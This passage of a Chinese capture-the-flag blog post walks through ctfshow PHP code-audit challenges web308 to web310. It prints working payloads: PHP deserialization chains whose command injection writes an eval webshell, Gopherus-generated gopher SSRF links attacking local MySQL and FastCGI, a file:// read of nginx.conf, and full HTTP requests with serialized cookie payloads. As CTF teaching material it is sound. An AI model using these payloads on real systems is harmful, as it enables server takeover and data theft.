+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">service</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$dao</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dao=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;;echo &quot;&lt;?php eval(\$_POST[a]);?&gt;&quot; &gt; /var/www/html/a.php;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">service</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>第二条</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;;echo &quot;&lt;?php eval(\$_POST[a]);?&gt;&quot; &gt; /var/www/html/a.php;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<h1 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h1><p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-170648.png" alt="1"></p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-170745.png" alt="1"></p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-170852.png" alt="1"></p>
+<p>这里可以打一个<code>ssrf</code>，去看看端口开的那个，打<code>MySQL</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopherus://127.0.0.1:3306</span><br></pre></td></tr></table></figure>
+
+<p>把上面的写进<code>poc</code>，发现延时写个<code>poc</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/tools/Gopherus-master/Gopherus-master]</span><br><span class="line">└─$ ./gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line">For making it work username should not be password protected!!!</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">Give MySQL username: root                                                                                                                                  </span><br><span class="line">Give query to execute: select &quot;&lt;?php eval($_POST[a]);?&gt;&quot; into outfile &quot;/var/www/html/a.php&quot;                                                                </span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF :</span><br><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%22%01%00%00%00%01</span><br></pre></td></tr></table></figure>
+
+<p>用户名为<code>root</code>文件里面有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%22%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<h1 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h1><p>一样的方法测出<code>9000</code>端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/tools/Gopherus-master/Gopherus-master]</span><br><span class="line">└─$ ./gopherus.py --exploit fastcgi                                                                                                                         </span><br><span class="line"></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">  ________              .__                                                                                                                                 </span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                  </span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                  </span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \                                                                                                   </span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;                                                                                                  </span><br><span class="line">        \/       |__|        \/     \/                 \/                                                                                                   </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">                author: $_SpyD3r_$                                                                                                                          </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">Give one file name which should be surely present in the server (prefer .php file)</span><br><span class="line">if you don&#x27;t know press ENTER we have default one:  index.php           </span><br><span class="line">Terminal command to run:  tac f*</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF:</span><br><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p>然后发包得到flag，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 61f538ef-2866-4428-93d9-9da7eaf15f88.challenge.ctf.show</span><br><span class="line">Cookie: PHPSESSID=nac58l7me9jasto9obsv31g9sb;service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo1NzU6ImdvcGhlcjovLzEyNy4wLjAuMTo5MDAwL18lMDElMDElMDAlMDElMDAlMDglMDAlMDAlMDAlMDElMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlRjYlMDYlMDAlMEYlMTBTRVJWRVJfU09GVFdBUkVnbyUyMC8lMjBmY2dpY2xpZW50JTIwJTBCJTA5UkVNT1RFX0FERFIxMjcuMC4wLjElMEYlMDhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMSUwRSUwMkNPTlRFTlRfTEVOR1RINTglMEUlMDRSRVFVRVNUX01FVEhPRFBPU1QlMDlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUlMjAlM0QlMjBPbiUwQWRpc2FibGVfZnVuY3Rpb25zJTIwJTNEJTIwJTBBYXV0b19wcmVwZW5kX2ZpbGUlMjAlM0QlMjBwaHAlM0EvL2lucHV0JTBGJTA5U0NSSVBUX0ZJTEVOQU1FaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDAlM0ElMDQlMDAlM0MlM0ZwaHAlMjBzeXN0ZW0lMjglMjd0YWMlMjBmJTJBJTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNweUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAwIjt9fQ==</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-site</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Referer: https://ctf.show/</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h1><p>文件还是没有变，只不过这里我们不知道打那个端口了，不过我们可以进行任意文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;file:///etc/nginx/nginx.conf&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 6b2bfeee-08ab-4f2b-b0f3-80a7f6c5669a.challenge.ctf.show</span><br><span class="line">Cookie: PHPSESSID=perb4j8irn77c7fju3r2jjf2hc;service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0=</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://6b2bfeee-08ab-4f2b-b0f3-80a7f6c5669a.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       4476;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        root         /var/flag;</span><br><span class="line">        index index.html;</span><br><span class="line"></span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;http://localhost:4476&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 6b2bfeee-08ab-4f2b-b0f3-80a7f6c5669a.challenge.ctf.show</span><br><span class="line">Cookie: PHPSESSID=perb4j8irn77c7fju3r2jjf2hc;service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyMToiaHR0cDovL2xvY2FsaG9zdDo0NDc2Ijt9fQ==</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://6b2bfeee-08ab-4f2b-b0f3-80a7f6c5669a.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>触发方法可能是没怎么提到，其实就那几个路由别弄错了(比如少路径等)就行</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechat.png" alt="baozongwi reward">
+        <span>reward</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>baozongwi
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://baozongwi.xyz/posts/87d475f3.html" title="ctfshow代码审计">https://baozongwi.xyz/posts/87d475f3.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/65b17802.html" rel="prev" title="shuangyuCTF2024">
+                  <i class="fa fa-angle-left"></i> shuangyuCTF2024
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/544d4a0e.html" rel="next" title="docker学习以及基础web题目部署">
+                  docker学习以及基础web题目部署 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baozongwi</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">3.1m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">87:21</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
